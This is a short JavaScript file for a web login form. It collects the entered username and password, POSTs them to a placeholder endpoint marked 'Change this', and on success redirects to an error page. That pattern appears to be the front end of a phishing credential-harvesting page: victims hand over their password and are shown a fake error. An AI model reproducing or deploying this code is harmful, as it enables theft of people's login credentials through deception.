const btn = document.getElementById("submit")

const username = document.getElementById("login")
const password = document.getElementById("password")


btn.addEventListener('click',(e) => {
    e.preventDefault()

    const usernameValue = username.value
    const passwordValue = password.value

    if(usernameValue != "" && passwordValue != "") {
        sendData({
            "username":usernameValue,
            "password":passwordValue
        })}
        
    else {
        alert("Enter your username and password.")
    }
})

function sendData(params) {
    // Change this
    fetch("/api/data",{
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            username: params.username,
            password: params.password
        })
    }).then(res =>{
        if(res.status == 200){
            window.location.href = "./error/error.html"
        }
    }).catch(err =>{
        alert("An error occured!\nContact support!")
        
    })
}